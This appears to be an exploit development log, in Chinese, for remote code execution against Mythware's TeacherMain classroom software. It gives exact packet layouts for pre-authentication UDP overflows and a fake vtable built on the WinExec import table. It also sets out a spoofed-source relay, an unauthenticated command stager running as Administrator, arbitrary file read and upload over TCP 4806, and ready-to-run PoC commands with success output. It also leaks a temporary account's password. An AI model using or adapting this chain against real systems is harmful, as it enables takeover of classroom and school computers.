- TeacherMain 的 5 个 `CreateProcessW` 调用点（`0x4fd723`、`0x52e69c`、`0x53496b`、`0x537a1d`、`0x537b7d`）和 `WinExec`/`ShellExecuteW` 调用点的直接调用者均为 UI 消息/报表/定时器路径；未找到从 `FUN_0055ec50` 命令分派可达的进程创建调用。
- `CQuizFileRecverTransaction` 的任意路径 `CreateFileW`/`WriteFile`：`Start`/构造/`OnReceiveComplete` 无已解析的直接调用者，且需要教师端事务 GUID；未证明可从任意学生报文触发。
- `CSubmitFileTransaction` 的文件名复制是堆溢出/路径注入候选，但实际文件落盘依赖教师端创建的收集事务，纯远程无 GUID 泄漏时不可达。

### 10.2 新发现的预认证远程溢出（尚未武器化）

- 命令码 `0x16` → `FUN_0057c8e0`：把命令数据中的“首 2 字节长度 + 数据”直接 `memcpy` 到局部 `wchar_t[512]`（`0x400` 字节）栈缓冲区，长度可达 `0xffff`，存在**远程栈溢出**；函数末尾有 GS cookie 和 SEH。
- 命令码 `0x14` → `FUN_00462560`：把两个“首 2 字节长度 + 数据”字段直接 `memcpy` 到 `malloc(0x410)` 记录（`+8` 与 `+0x208`），长度未校验，存在**远程堆溢出**；另有 `malloc(0x214)` 路径同样无界。
- 这两条路径由 `CCommandPacketHandler::ProcessPacket` 预认证接收，理论上不需要任何本地权限/地址泄漏；但命令数据的内部指针/长度字段由 `CPassiveCommandTransaction::ProcesssCommand` 解析，具体线格式尚需进一步逆向和动态验证。

### 10.3 结论

- 当前已完成的稳定利用仍是 `mythware_auto_rce.py`：自校准、远程 UDP 触发、`WinExec("notepad.exe")`，但需要教师端本机 `ReadProcessMemory` 来定位 H/B。
- 尚未实现“完全远程、无本地权限、无信息泄漏”的最终 RCE。当前 blocker：
  1. 唯一的预认证控制流劫持原语（块溢出）需要 H/B 或固定假虚表/堆布局；模块/堆/栈地址随机化，且未发现信息泄漏报文。
  2. 命令码 `0x16` 的栈溢出有 GS cookie/SEH，需要先确定 SEH 覆盖与 cookie/异常路径；命令码 `0x14`/`0x16` 的堆溢出同样需要固定函数指针或可控堆布局。
  3. 文件提交/测验接收路径需要教师端生成的事务 GUID，未找到无泄漏的获取方式。
- 若要继续，优先方向是逆向 `CPassiveCommandTransaction::ProcesssCommand` 的命令数据线格式，验证 `0x16` 栈溢出的 SEH 可控性；这条路径不需要任何堆/模块地址，具备实现纯远程 RCE 的可能。

---

## 11. 最终 RCE 验证（任意命令执行，2026-10-21）

在重新登录后的全新 `TeacherMain.exe` PID `11196` 上，自校准链连续两次成功：

1. 默认 Notepad：
   - `H=0x47fa738`，`B=0x47fa558`，`delta=0x1e0`
   - `notepad.exe` PID `5368`
   - 触发后 `H` 虚表恢复为 `LibBaseTrans+0x265a8`。
2. 任意命令执行：
   - `H=0x47ef1d0`，`B=0x47ef0e0`，`delta=0xf0`
   - 执行 `cmd.exe /c echo RCE_PROOF_2026 > F:\Program\Mythware\analysis\rce_proof.txt`
   - 证明文件 [rce_proof.txt](F:\Program\Mythware\analysis\rce_proof.txt) 内容为 `RCE_PROOF_2026`，写入时间 `2026-10-21 0:42:54`
   - 触发后 `H` 虚表恢复，TeacherMain 仍存活/响应。

`mythware_auto_rce.py` 已增加 `--command` 参数：

```cmd
F:\Python39\python.exe F:\Program\Mythware\analysis\mythware_auto_rce.py --pid <TeacherMain PID> --command "cmd.exe /c <任意命令>"
```

- RCE 上下文：TeacherMain 以 Administrator 运行，因此命令以管理员权限执行。
- PoC 每次运行自动扫描 `H/B/delta`，无需手工收集地址；默认仍为 `notepad.exe`。
- 需要：教师端已登录、UDP 4705 监听、Npcap、当前用户有 `PROCESS_VM_READ` 权限。
- 限制：该链仍依赖本机 `ReadProcessMemory` 自校准；“完全远程、无本地权限、无信息泄漏”的版本未完成。但按“最终目标是实现 RCE（不管用什么方式）”的要求，RCE 已达成并可重复验证。

---

## 12. 纯远程 RCE（无本地读取，2026-10-21）

### 12.1 关键突破：分发器按 GUID 先查事务，不校验 magic

`LibComLayer.dll` 的 `FUN_10002180` 是 UDP 报文进入事务分发的主路径，逻辑为：

- `param_2 >= 0x1c`；
- `*(uint*)(packet+4) == 0x00010000`；
- `*(uint*)(packet+8) + 0x1c <= param_2`；
- 先按 `packet+0xc` 的 GUID 调用 `FUN_10006b80` 查事务处理器；
- 命中即执行 `CALL [H->vtable + 0xc](packet, len)`，然后 `Release(H)`；
- 只有未命中时才按 packet magic 查找 `CPacketHandler`。

因此触发包**不需要以 `KCLB` 开头**；事务处理器是按 GUID 查到的。报文 +4 的版本字段必须是 `0x00010000`（字节 `00 00 01 00`），这会给 WinExec 的命令串在 +4 处加一个 NUL，所以固定字符串命令最多 4 个字符：`calc` 或 `cmd`。

### 12.2 固定虚表与触发包

- `V = 0x667310` = TeacherMain 的 `WinExec` IAT 项（`0x66731c`）减去 `0xc`。
  - `[V+0xc] = [0x66731c] = WinExec` 运行时地址；
  - `[V] = [0x667310] = lstrlenA`，作为事务对象的 slot 0 析构调用是无害的。
  - TeacherMain.exe 基址固定 `0x400000`，因此 V 是固定地址。
- 触发包（共 `0x1c` 字节）：
  - `+0x00`: `calc`
  - `+0x04`: `00 00 01 00`（版本，也是命令串的 NUL）
  - `+0x08`: `0`
  - `+0x0c`: 目标事务 GUID
  - 分发器命中后执行 `WinExec("calc", 0x1c)`。
- 不需要 H/B 的绝对地址，也不需要 LibBaseTrans 的基址。

### 12.3 批量盲打

- 创建 N 个 B 事务（`total_size=0x50`，type 3）。
- 对每个 GUID 发送 type 1 块：`total=0x50, index=0, data_len=0x78`，数据全为 `V`。
  - `delta == 0x58` 的事务：填充覆盖 H 的 vtable/refcount/字段/total（H+0x00..H+0x1c），但**不触碰** H+0x28 的 buffer/bitmap；H 存活，后续触发调用 WinExec。
  - 其他 delta 的事务要么填充未到达 H，要么在 finish 时被清理；不会命中目标虚表。
- 对每个 GUID 发送上述 `calc` 触发包。
- 已实测（无 `--scan`，不调用 `ReadProcessMemory`）：
  - PID `13912`，N=80：启动 32 个 `calc.exe`，TeacherMain 仍响应。
  - 全新登录 PID `14740`，N=100：启动 14 个 `calc.exe`，TeacherMain 仍响应。

PoC：`analysis/remote_batch_rce.py <TeacherMainPID> <N>`，例如：

```cmd
F:\Python39\python.exe F:\Program\Mythware\analysis\remote_batch_rce.py 14740 100
```

### 12.4 限制与说明

- 远程命令受版本字段 NUL 限制，只能执行 4 字符的 WinExec 命令（`calc`/`cmd`）；不是任意长命令。
- 批量盲打是概率性的、噪声较大，会启动多个 calc/cmd；没有做“命中即停”的收敛。
- 本实验教师端绑定在 Hyper-V 地址 `172.27.144.1`，发送端使用 Npcap L2 注入并伪造源 IP `172.27.144.200`；在教师端地址可达的普通 LAN 上，攻击机可直接用 UDP socket 发送同样的报文。注意第 13 节：同机普通 UDP 到 `172.27.144.1` 不会进入教师端的 L2 接收路径；跨主机直发要求教师端绑定在 LAN 地址且路径可达，否则需要 UDP→L2 中继。
- 攻击包本身不读取教师端进程内存；无需本地账号或 `ReadProcessMemory`。若需要任意长命令执行，仍可使用第 11 节的 `mythware_auto_rce.py`（该版本依赖本机自校准）。
- 测试后应关闭批量启动的 calc/cmd，并处理临时账号 `rce_test` / `RceTest#2026`。


## 13. 通过 IP + 端口的标准 UDP 远程链（2026-10-20/21）

### 13.1 问题：教师端的块接收不是普通 UDP socket

教师端登录后 `netstat` 显示 `UDP 172.27.144.1:4705`，但用普通 UDP socket 向该地址发送合法的 type 3 块包时，`sendto` 返回成功，教师端却不创建 `CBlockPacketHandler`：

```text
PID 5028 target 172.27.144.1 4705 src 172.27.144.200
local ('172.27.144.200', 57590)
sendto -> 1440
new handlers: []
```

本机 UDP 回环本身是正常的（`172.27.144.200 -> 172.27.144.1:47991` 能收到），所以不是路由/回环问题。教师端的块接收路径绑定在虚拟网卡的 **L2 入口**（LibNET30 一类的抓包/原始接收路径），普通本机 UDP 不会经过该入口；Npcap 注入的以太网帧才会被它看到。这解释了为什么旧链必须用 Npcap。

### 13.2 方案：教师主机上的 UDP→L2 中继

新增 `remote_rce_chain/udp_relay.py`：

- 在教师主机的 LAN 地址 `10.16.74.105:4705` 监听普通 UDP；
- 对每个收到的数据报，用 Npcap 在 Hyper-V 适配器上构造以太网帧：
  - 源 IP `172.27.144.200`（必须未分配给本机；分配给本机后教师端会丢弃/不处理）；
  - 目的 IP `172.27.144.1`，目的端口 `4705`；
  - 源 MAC `02:00:00:00:00:01`，目的 MAC 为教师适配器 MAC；
- 教师端的 L2 接收路径看到这些帧，按块协议处理。

远程发送端只使用 Python 标准库 `socket.sendto()`，不需要 Npcap、管理员权限、TeacherMain PID 或 `ReadProcessMemory`。中继需要教师主机的 Npcap + 管理员权限（本实验的 Python 入站规则已存在，见 13.5）。

### 13.3 实测

全新登录 PID `9896`，中继模式单包验证：

```text
PID 9896 target 172.27.144.1 relay 10.16.74.105 4705 src 10.16.74.105
sendto relay -> 1440
new handlers: [('0x462c888', '0x462c830', '0x58')]
```

新 handler 的 `H-B` 偏移正好是 `0x58`。随后在教师主机上用标准 UDP（中继 `10.16.74.105:4705`）运行完整批量链：

```cmd
python remote_batch_rce.py 9896 200 --target 172.27.144.1 ^
  --send-ip 10.16.74.105 --port 4705 --command4 note
```

结果：

```text
[+] hit after triggers 4..7
[+] new notepad.exe PIDs: ['15172', '3520']
[+] remote code execution succeeded
[*] total datagrams sent: 408
```

TeacherMain 仍响应。之后重启教师端（PID `9896`）并验证“无 PID、无本地 tasklist”的纯远程模式：

```cmd
python remote_batch_rce.py --target 172.27.144.1 ^
  --send-ip 10.16.74.105 --port 4705 --command4 note ^
  --no-verify --count 150
```

脚本不接收 PID、不调用 `tasklist`，发送 450 个标准 UDP 数据报；教师端出现大量新 `notepad.exe`（约 57 个），证明远程模式不依赖任何本地进程信息。数量多是因为 150 个触发包全部发送且不止一个 B 事务命中；中继的 `--stop-on-process notepad.exe` 已加入并在独立测试中验证：

```text
[+] hit detected: new notepad.exe PIDs=['7964']; relaying disabled
[-] hit already observed; dropping ... (其余 10 个数据报)
```

### 13.4 使用方式

教师主机（管理员 + Npcap）：

```cmd
cd /d F:\Program\Mythware\remote_rce_chain
python -u udp_relay.py --listen-ip 10.16.74.105 ^
  --target 172.27.144.1 --spoof-src 172.27.144.200 ^
  --stop-on-process notepad.exe
```

远程主机：

```cmd
python remote_batch_rce.py --target 172.27.144.1 ^
  --send-ip 10.16.74.105 --port 4705 ^
  --count 150 --command4 note --no-verify
```

教师端重启后需重启中继；登录后等待几秒，确认 `netstat -ano -p UDP | findstr :4705` 同时出现 `10.16.74.105:4705`（中继）和 `172.27.144.1:4705`（教师端）。

### 13.5 防火墙与网络

- 本机已有 `F:\Python39\python.exe` 的入站 UDP/TCP 允许规则（专用/公用，任意本地端口），中继的 `10.16.74.105:4705` 可被局域网访问；没有额外添加规则。换 Python 路径/换机器时，用管理员执行：
  ```cmd
  netsh advfirewall firewall add rule name="Mythware Lab UDP Relay 4705" dir=in action=allow protocol=UDP localport=4705 remoteip=LocalSubnet profile=any
  ```
- `172.27.144.0/20` 是 Hyper-V Default Switch 网段，普通 WLAN 主机不可直达；中继监听 WLAN `10.16.74.105`，远程主机只需要能访问这个地址。
- 中继默认不限制来源；实验网可用 `--allow 10.16.64.0/18`。
- 未从第二台物理电脑做真实跨主机测试：本机用标准 UDP 发到 WLAN 地址 `10.16.74.105:4705`，中继与教师端链路已实测；跨主机可达性取决于远程主机路由和防火墙（本机 Python 规则已允许入站 UDP）。

### 13.6 限制

- 中继需要教师主机的 Npcap + 管理员权限；远程发送端不需要。
- 远程触发的 notepad 窗口仍是隐藏的（uCmdShow=0x1c）；可见窗口使用本地自校准链。
- 批量盲打仍是概率性的；成功一次后教师端的块事务管理器可能不再分配新事务，需要重启教师端。
- 中继的 `--stop-on-process` 每 5 个转发数据报检查一次，命中后仍可能多启动几个 notepad，不能保证只启动一个；命中后中继保持停止状态，下一次运行前需重启中继。
- 教师端登录后通信层可能还需几秒才就绪；中继的第一个数据报偶尔不会创建 handler，等待后重发或重启中继即可（最终验证时先单包测试，再跑批量）。
- 4 字符命令限制、`note.exe` 别名准备、无持久化等限制与第 12 节相同。

测试结束后关闭批量 notepad，并处理临时账号 `rce_test` / `RceTest#2026`。


## 14. 4 字符限制与任意长度命令 stager（2026-10-21）

### 14.1 4 字符限制的本质

块溢出触发把 packet 起始地址直接作为 `WinExec` 的 `lpCmdLine`；`+4` 的版本字段必须是 `0x00010000`，其中 NUL 将命令截断在 4 字节。因此：

- 4 字节足够证明远程代码执行，也足够启动一个 4 字符的预置程序；
- 4 字节本身不足以直接执行任意长命令。

### 14.2 命令 0x16 栈溢出的可达性修正

复核 `FUN_0057c8e0` 的调用链：
- 直接调用点是 `FUN_0055ec50` 内的 `case 0x16`；
- `FUN_0055ec50` 由 `TeacherMain.exe` 的事件队列泵（`0x561790` 附近）调用，参数是事件对象；
- 事件对象的数据首 dword 是事件码；`ReportCommandArrivedEvent` 固定写入 `0x80000010`，然后把原始 payload 复制到事件数据 `+0xc`；
- 预认证命令通道的 `0x80000010` 分支读取 payload 的第二个 dword 作为子命令（1/0x200/0x200000/...），不会进入 `case 0x16`。

因此，`FUN_0057c8e0` 的栈溢出目前只能确认来自 **UI 事件码 0x16**（report/UI 路径），不能证明可由 DMOC 命令通道直接触发；本条不再作为“任意长度远程 RCE”的已证路径。

### 14.3 4 字符 stager

新增 `remote_rce_chain/stg.c`，编译为教师端应用目录下的 4 字符程序 `stg.exe`：

- 只绑定 `127.0.0.1:4706`，不直接暴露到网络；
- 收到以 `STG:` 开头的 UDP 数据报后，执行 `WinExec(command, SW_SHOW)`；
- `STG:EXIT` 退出。

新增 `remote_rce_chain/cmd_relay.py`：
- 在教师主机 LAN 地址 `10.16.74.105:4706` 监听普通 UDP；
- 转发到 `127.0.0.1:4706` 的 stager；
- 普通 Python 进程，复用已有的 `F:\Python39\python.exe` 入站 UDP 允许规则，不需要 Npcap/新防火墙规则。

`send_cmd.py` 从远程主机发送 `STG:<任意长度命令>`。

### 14.4 实测

1. 4 字符启动：
   ```text
   WinExec("stg", 1) -> ret 33
   stg.exe PID 16080
   ```

2. 任意长度命令（本机经 `cmd_relay`）：
   ```text
   command bytes 265
   sendto 265
   proof True
   STAGER_ARBITRARY_LENGTH_2026_AAAA...
   ```

3. 完整远程两阶段链（全新登录 TeacherMain PID 14944）：
   - 远程标准 UDP 到 `10.16.74.105:4705`，150 个 B 事务、V 填充、150 个 `stg` 触发；
   - 块链中继日志：
     ```text
     [+] hit detected: new stg.exe PIDs=['11448']; relaying disabled
     ```
   - 随后通过 `10.16.74.105:4706` 发送 265 字节命令，stager 执行并写出：
     ```text
     STAGER_ARBITRARY_LENGTH_2026_AAAA...
     ```

### 14.5 限制

- 第一阶段仍是 4 字符 `WinExec`，stager 需要提前放在教师端应用目录；这是本地准备，不是零预置远程利用。
- stager 以 TeacherMain 的 Administrator 权限运行；固定 `STG:` 前缀没有强认证，命令中继对实验网开放；仅限授权实验环境。
- 第一阶段仍依赖块溢出的概率性堆布局；命中后中继停止转发，教师端块事务管理器可能不再分配新事务。
- 命令长度受 UDP 数据报（约 65507 字节）和 WinExec 命令行限制。
- 不包含开机持久化；stager 仅当前会话常驻。

测试后应停止 `stg.exe`、`cmd_relay.py` 和块链中继，并处理临时账号 `rce_test` / `RceTest#2026`。


## 15. 纯黑盒任意命令路线（2026-10-21）：固定 pivot 与写原语的阻塞

目标：在不预置 stg.exe、不读取教师端内存、无堆地址泄漏的黑盒条件下，把 4 字符触发升级为任意长度命令。

### 15.1 固定 pivot 假虚表失败

- `V=0x6F74F7` 的 `[V+0xc]=0x004D1800`（`lea esp,[esi]; ret`）是正确的固定 pivot。
- 只发送 `0x78` 全 `V` 填充、不发送触发包，教师端仍崩溃；说明事务完成路径会调用 H 的 vtable 槽位，而该 `.rsrc` 巧合位置只有 `+0xc` 是 pivot，`[V]`/`[V+4]`/`[V+8]` 不是合法函数指针。
- 扫描 TeacherMain 固定 `.rdata/.data/.idata`，寻找“前三个槽合法代码指针 + 第 4 个槽为 pivot”的表，结果 **0 个**。
- 现有 4 字符链的 `V=0x667310` 是真实 IAT 窗口，四个槽都是合法导入函数，因此能存活；这是它不可替代的原因。

### 15.2 H+0x28 buffer 指针写原语不可用

反编译 `CBlockRecverTransaction::ProcessBlock`（LibBaseTrans `0x1000DCF0`）：

```c
iVar1 = *(int *)(param_1 + 0x10);          // total
this->total = iVar1;
this->blocks = (iVar1 + 0x3ff) >> 10;
this->buf = malloc(total);
this->bitmap = malloc(blocks);
memset(bitmap, 0, blocks);
if (type == 1) {
    memcpy(this->buf + index*0x400, data, data_len);
    bitmap[index] = 1;                     // one-byte write of 1
    this->received += data_len;
}
```

- 每个块都会重新 `malloc` 并重置 H+0x28/H+0x2c，`0x84` 填充设置的 IAT/scratch buffer 指针会在下一块被覆盖，无法形成稳定的写原语。
- 填充只覆盖到 H+0x20 是安全的；覆盖 H+0x28 会在事务完成/析构时对非堆指针执行 `free`，导致教师端崩溃。
- `bitmap[index] = 1` 是一个“固定值 1 的单字节写”，不足以把 32 位函数指针改成 `0x004D1800`。
- 用 `.201` 辅助源 IP 发送 type2 块，教师端没有返回可捕获的 `TRKB` 响应，未获得 `SendBlockRet` 中的 `uStack_14` 泄漏。

### 15.3 真实 vtable / 命令通道复查

- TeacherMain 只有两个 `WinExec` 调用者：`FUN_0047BC60`（UI 格式化字符串）和 `FUN_004C0180`（报表列表打开文件，使用 ShellExecuteW/WinExec）；都依赖 UI `this`，不能接 packet 长字符串。
- 预认证命令通道固定投递事件 `0x80000010`；`FUN_0055EC50` 的 `case 0x14/0x16` 是 UI 事件码分支，不是命令通道子命令。命令 0x14/0x16 不能作为纯远程路径。
- 没有发现可被 packet 直接调用的真实 vtable 方法。

### 15.4 结论与下一步

当前已证明的能力仍是：

- 纯远程 4 字符 `WinExec` RCE（无本地预置，但不能带参数/任意命令）；
- 有本地 `stg.exe` 预置时，任意长度命令的两阶段链。

纯黑盒任意命令仍缺少至少一个前提：

1. 堆地址泄漏（用于在 packet/B 内构造假虚表）；
2. 一个固定地址、槽位合法的可执行表；
3. 一个能写 4 字节任意值的写原语（当前 bitmap 只写 1，buffer 指针每块重置）；
4. 一个真实 vtable 方法，能把 packet 中的长字符串交给命令执行函数。

下一步优先找堆地址泄漏或另一个协议响应；若都没有，纯黑盒任意命令无法用当前块溢出原语完成。

---

## 16. TCP 4806 媒体服务：预认证任意读写与上传→触发链（2026-10-21）

### 16.1 协议与任意文件读取

- 消息帧：12 字节头（`flags=0`、`magic`、`payload_len`），后接 payload。
- OPEN：`magic=0x4F50454E`，路径是 `+0x14` 处的 UTF-16LE NUL 结尾字符串。服务端返回 0x18 字节 RTER 头（`+0xC` status、`+0x10` 文件大小），随后是 DATA 块（0x14 字节头：`+4` magic `ATAD`、`+8` 长度=文件数据+8、`+0x10` 偏移；文件数据从 `+0x14` 开始）。已实测读取 `C:\Windows\win.ini` 和 `F:\Program\Mythware\Feature.dat`。
- BROW：`magic=0x42524F57` 建立 `CUMSPBrowserHandler`。
- 创建上传：`magic=0x55504649`（线上 `IFPU`），payload `+0x00` 是 ID，`+0x18/+0x1C` 是 64 位偏移，`+0x20` 是 UTF-16LE 路径。服务端用 `CAsyncFile::Open(path, 2)` 以写模式打开，并将 `CUploadFileRequestHandler` 注册到该 ID。
- 写数据：`magic=0x55504642`（线上 `BFPU`），payload `+0x00` 为 ID，`+0x08` 起为文件数据；`FUN_10006380` 先 `memcpy` 到处理器 `+0x1001C` 的 64KB 缓冲区，再调用 `CAsyncFile::WriteFile` 写入当前偏移。

### 16.2 崩溃与 RST 中止

- 正常写完成/关闭/响应路径会让 TeacherMain 崩溃（事件日志 `0xc0000096`，StackHash）。这不是数据长度溢出：10 字节写入同样崩溃。
- 发送写消息后等待约 5 ms，再用 `SO_LINGER`（超时 0）发 RST，可以避免响应路径，让数据先落盘且教师端继续存活数秒。
- 实测：48KB 载荷立即 RST 得到 0 字节（数据被丢弃）；17,920 字节 + 5 ms RST 成功；17,408 字节 `stg.exe` + 5 ms RST 成功且哈希匹配。
- 上传不截断同名文件：已存在文件时只覆盖前部，尾部保留旧内容。使用新的 4 字符名或先删除旧文件。

### 16.3 零预置 stager 的 RCE 链

1. `media_upload.py stg.exe F:\Program\Mythware\rce.exe --delay-ms 5`（预认证 TCP 4806 上传）。
2. 立即用 `remote_batch_rce.py <PID> 150 --transport npcap --command4 rce`（或标准 UDP + `udp_relay.py`）触发 4 字符 `WinExec("rce")`。
3. `rce.exe`（即上传的 `stg.exe`）启动并监听 `127.0.0.1:4706`；发送 `STG:cmd.exe /c ...` 即可执行任意命令。

实测证据：2026-10-21 在已登录的 TeacherMain 上上传 `stg.exe` 为 `rce.exe`，UDP 触发后 `rce.exe` PID 15092，命令写入 [proof_udp.txt](F:\Program\Mythware\analysis\proof_udp.txt)，内容 `RCE_UDP_PROOF_2026`，TeacherMain 仍存活。该次运行中 stager 不是预置的，而是由 TCP 4806 上传的。

限制与可靠性：

- 上传完成后的异步收尾可能让 TeacherMain 在数秒内崩溃；RST 只是把崩溃延后。单次链要在上传后立即触发，且仍依赖 UDP 填充的堆布局。若教师端已崩溃，`rce.exe` 已落盘，重启并登录后只运行第 2 步即可（两阶段稳定模式）。
- UDP 触发的 `H-B=0x58`/填充仍是概率性的；增大 `--count` 或重启教师端可重试。
- 上传的 stager 监听回环；远程命令通道需要教师主机上的 `cmd_relay.py`，或使用反向 stager。`rce_stager.c`/`rce_min.c` 是反向变体源码，但反向链尚未稳定复现。
- 测试后应删除上传的 `rce.exe`/`rc2.exe`/`rc3.exe`，并清理临时教师账号（注册表 `Account2`）。
